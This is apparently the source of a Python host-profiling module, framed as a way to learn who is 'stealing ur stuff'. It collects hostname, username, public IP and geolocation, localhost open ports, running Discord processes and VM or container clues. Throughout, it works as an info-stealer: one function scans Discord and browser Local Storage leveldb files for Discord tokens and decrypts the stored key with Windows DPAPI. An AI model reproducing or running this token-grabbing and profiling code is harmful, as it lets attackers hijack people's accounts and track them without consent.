# sniffs the host for info so u know whos stealing ur stuff
# ip, ports, discord process, vm detection, token grab, etc

import os
import re
import base64
import ctypes
import ctypes.wintypes
import json as _json
import socket
import platform
import subprocess
import sys
import time as _time
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# --------------- win32 dpapi stuff (for discord token) ---------------

_CRYPTPROTECT_UI_FORBIDDEN = 0x1

class _DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def _dpapi_decrypt(data: bytes) -> bytes:
    # uses windows crypt32 to decrypt DPAPI blobs
    blob_in = _DATA_BLOB(len(data), ctypes.c_char_p(data))
    blob_out = _DATA_BLOB()
    try:
        ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, _CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out)
        )
        out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return out
    except:
        # fallback to powershell if ctypes fails
        try:
            b64 = base64.b64encode(data).decode()
            ps = f'Add-Type -AssemblyName System.Security;[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("{b64}"),$null,"CurrentUser"))'
            r = subprocess.check_output(["powershell", "-NoProfile", "-Command", ps], timeout=10, stderr=subprocess.DEVNULL)
            return r
        except:
            return b""

# --------------- ip stuff ---------------

def _pub_ip(timeout: float = 4.0) -> str:
    # grabs ur public ip from ipify
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=timeout) as r:
            return r.read().decode("utf-8").strip()
    except:
        return "DEAD"


def _local_ip() -> str:
    # best effort local ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def grab_host() -> dict:
    # who are u
    return {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER") or "???",
        "local_ip": _local_ip(),
        "public_ip": _pub_ip(),
        "platform": platform.platform(),
        "python_version": sys.version,
    }


# --------------- port scan ---------------

_ports_to_check = [
    (22, "SSH"),
    (80, "HTTP"),
    (443, "HTTPS"),
    (3306, "MySQL"),
    (3389, "RDP"),
    (5432, "PostgreSQL"),
    (6379, "Redis"),
    (8080, "HTTP-Alt"),
    (8443, "HTTPS-Alt"),
    (27017, "MongoDB"),
    (5000, "Flask/Dev"),
    (3000, "Node/Dev"),
    (5900, "VNC"),
    (25565, "Minecraft"),
]


def _poke_port(host: str, port: int):
    # tries to connect to a port, returns if its open
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.6)
    ok = s.connect_ex((host, port))
    s.close()
    return port, ok == 0


def scan_ports(host: str = "127.0.0.1") -> dict:
    # scans common ports on localhost
    res = {}
    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = {pool.submit(_poke_port, host, p): (p, lbl) for p, lbl in _ports_to_check}
        for f in as_completed(futures):
            port, label = futures[f]
            try:
                _, is_open = f.result()
                res[f"{port}/{label}"] = "OPEN" if is_open else "closed"
            except:
                res[f"{port}/{label}"] = "err"
    return res


# --------------- process / vm checks ---------------

def _proc_running(name: str) -> bool:
    # checks if a process is running (windows uses tasklist, linux uses pgrep)
    try:
        if sys.platform == "win32":
            out = subprocess.check_output(
                ["tasklist", "/FI", f"IMAGENAME eq {name}"], shell=False, timeout=5
            )
            return name.encode().lower() in out.lower()
        else:
            out = subprocess.check_output(["pgrep", "-f", name], timeout=5)
            return bool(out.strip())
    except:
        return False


def discord_check() -> bool:
    # is discord open
    names = ["Discord.exe", "discord", "DiscordCanary.exe", "DiscordPTB.exe"]
    for n in names:
        if _proc_running(n):
            return True
    return False


def _grab_discord_token() -> str:
    # yoinks discord token from appdata if they have it saved
    tokens = []
    base_paths = []

    # try common discord install paths
    appdata = os.environ.get("APPDATA", "")
    if appdata:
        base_paths.append(Path(appdata) / "discord")
        base_paths.append(Path(appdata) / "discordcanary")
        base_paths.append(Path(appdata) / "discordptb")
        base_paths.append(Path(appdata) / "Lightcord")
        base_paths.append(Path(appdata) / "ArmCord")

    # try roaming
    roaming = os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming")
    if os.path.isdir(roaming):
        for client in ["discord", "discordcanary", "discordptb", "Lightcord", "ArmCord", "Opera Stable", "BraveSoftware"]:
            ldb = os.path.join(roaming, client, "Local Storage", "leveldb")
            if os.path.isdir(ldb):
                base_paths.append(Path(ldb))

    for base in base_paths:
        try:
            ldb = base / "Local Storage" / "leveldb"
            if not ldb.is_dir():
                continue

            # check .ldb + .log files for tokens
            for f in ldb.iterdir():
                if not (f.suffix in (".ldb", ".log")):
                    continue
                try:
                    raw = f.read_bytes()
                    # regex for discord tokens
                    found = re.findall(rb'[a-zA-Z\d_-]{23,28}\.[a-zA-Z\d_-]{6,7}\.[a-zA-Z\d_-]{27,}', raw)
                    for t in found:
                        try:
                            tok = t.decode("utf-8")
                            if tok not in tokens:
                                tokens.append(tok)
                        except:
                            pass
                except:
                    pass

            # also check the local state for encrypted token
            lstate = base / "Local State"
            if lstate.is_file():
                try:
                    cfg = _json.loads(lstate.read_text(encoding="utf-8"))
                    os_crypt = cfg.get("os_crypt", {})
                    key_b64 = os_crypt.get("encrypted_key", "")
                    if key_b64:
                        key_b = base64.b64decode(key_b64)
                        # strip DPAPI prefix "DPAPI"
                        if key_b[:5] == b"DPAPI":
                            dec = _dpapi_decrypt(key_b[5:])
                        else:
                            dec = key_b
                except:
                    pass
        except:
            pass

    return ", ".join(tokens) if tokens else "none found"


def _get_timezone() -> str:
    # figures out what timezone theyre in
    # try datetime first
    try:
        import datetime as _dt
        tz = _dt.datetime.now(_dt.timezone.utc).astimezone().tzinfo
        if tz is not None:
            return str(tz)
    except:
        pass

    # fallback to time.tzname
    try:
        return f"{_time.tzname[0]} (UTC{_time.timezone / -3600:+.0f})"
    except:
        pass

    return "???"


def _get_country(ip: str) -> str:
    # figures out country from ip via ip-api
    if not ip or ip in ("DEAD", "127.0.0.1", "UNAVAILABLE"):
        return "???"
    try:
        r = urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=country,city,regionName,org,timezone", timeout=5)
        data = _json.loads(r.read().decode("utf-8"))
        parts = []
        if data.get("country"):
            parts.append(data["country"])
        if data.get("city"):
            parts.append(data["city"])
        if data.get("regionName"):
            parts.append(data["regionName"])
        return ", ".join(parts) if parts else "???"
    except:
        return "???"


def vmcheck() -> dict:
    # tries to figure out if ur in a vm or container or whatever
    clues = {}

    clues["docker_env_file"] = os.path.exists("/.dockerenv")

    try:
        with open("/proc/1/cgroup", "r") as f:
            cg = f.read().lower()
        clues["docker_cgroup"] = "docker" in cg or "kubepods" in cg
    except:
        clues["docker_cgroup"] = False

    vms = {"vbox": False, "vmware": False, "qemu": False}
    if sys.platform == "win32":
        try:
            si = subprocess.check_output(["systeminfo"], shell=False, timeout=10)
            si = si.decode("utf-8", errors="replace").lower()
            vms["vbox"] = "virtualbox" in si
            vms["vmware"] = "vmware" in si
            vms["qemu"] = "qemu" in si
        except:
            pass
    else:
        try:
            d = subprocess.check_output(["dmesg"], timeout=5).decode("utf-8", errors="replace").lower()
            vms["vbox"] = "vbox" in d
            vms["vmware"] = "vmware" in d
            vms["qemu"] = "qemu" in d
        except:
            pass

    clues.update(vms)
    return clues


# --------------- all together ---------------

def sniff_everything() -> dict:
    # one call to grab everything at once
    host = grab_host()
    pub_ip = host.get("public_ip", "")

    report = {"host": host}

    try:
        report["ports"] = scan_ports()
    except:
        report["ports"] = {"error": "scan died"}

    try:
        report["discord_process"] = discord_check()
    except:
        report["discord_process"] = "err"

    try:
        report["discord_token"] = _grab_discord_token()
    except:
        report["discord_token"] = "err"

    try:
        report["timezone"] = _get_timezone()
    except:
        report["timezone"] = "???"

    try:
        report["country"] = _get_country(pub_ip)
    except:
        report["country"] = "???"

    try:
        report["container_vm"] = vmcheck()
    except:
        report["container_vm"] = {"error": "vm check died"}

    return report
